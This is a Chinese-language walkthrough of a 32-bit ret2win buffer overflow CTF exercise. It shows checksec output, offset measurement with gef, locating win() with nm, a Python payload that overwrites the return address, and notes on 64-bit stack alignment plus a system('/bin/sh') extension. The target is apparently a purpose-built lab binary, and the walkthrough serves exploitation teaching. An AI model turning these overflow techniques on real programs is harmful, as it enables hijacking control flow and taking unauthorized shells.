# 参考解法完整过程(ret2win,32 位)

## 0. 侦察

```bash
gcc -m32 -g -O0 -fno-stack-protector -no-pie vuln.c -o vuln
gdb -q ./vuln -ex checksec -ex quit
#  Canary ✘   PIE ✘   NX ✓
```

Canary 关 → 可覆盖返回地址而不被检测;PIE 关 → 代码地址固定可写死;NX 开 → 不能往栈放 shellcode 执行,故选 **ret2win**(跳已有函数)。

## 1. 漏洞

`vulnerable()`:`char buf[64]` 但 `read(0, buf, 256)` —— 溢出覆盖 saved ebp 和返回地址。

## 2. 测偏移

```bash
gdb -q ./vuln
gef> pattern create 100
gef> run                       # 粘贴模式 / 或 run < pat.bin
# 崩溃后,eip 被模式覆盖:
gef> pattern offset $eip       # → 32
```

崩溃时 `$eip = 0x61616165`("eaaa"),反查得 **OFFSET = 32**
(= 16 buf + 12 对齐填充 + 4 saved ebp;用测的,别算)。

## 3. 找地址

```bash
nm vuln | grep ' T win'        # win = 0x08048386
```

## 4. 拼 payload(32 位,无对齐坑)

```python
payload = b"A"*32 + struct.pack("<I", 0x08048386)   # 小端 4 字节
```

```bash
python3 exploit.py | ./vuln    # → FLAG{control_flow_hijacked}
```

32 位返回地址 4 字节、参数走栈,没有 64 位的 `movaps` 栈对齐问题,所以**不需要 ret-gadget**。

## 5. 缓冲坑(两种架构都有)

管道下 stdout 全缓冲。本题 win() 调 `exit(0)` 会 flush,所以能看到 FLAG;
否则 win 返回垃圾地址、在 flush 前崩溃 → 误以为失败。

---

## 附:64 位差异(进阶时再看)

同样源码用 64 位编(去掉 `-m32`):

- 偏移变 **40**,地址是 **8 字节**(`struct '<Q'`)。
- 多一个**栈对齐**坑:`puts` 用 SSE 的 `movaps` 要求 `call` 前 `rsp%16==0`(即函数入口 `rsp%16==8`)。
  直接 ret 进 win 会差 8 字节、崩在 libc 内部。
  解法:在 win 地址前垫一个**裸 `ret` gadget**(`objdump -d vuln | grep -m1 'c3 *ret'`),多弹一次栈补齐。
- 验证对齐:`gdb ... -ex 'break *win' -ex 'run < payload' -ex 'p $rsp & 0xf'`(要 0x8)。

## 练习延伸

- 32→64:把这题用 64 位重做一遍,亲手踩一次对齐坑。
- 把目标从"调用 win"换成自己 `system("/bin/sh")`:32 位参数压栈(`win_addr + fake_ret + p32("/bin/sh"地址)`),比 64 位还直观。
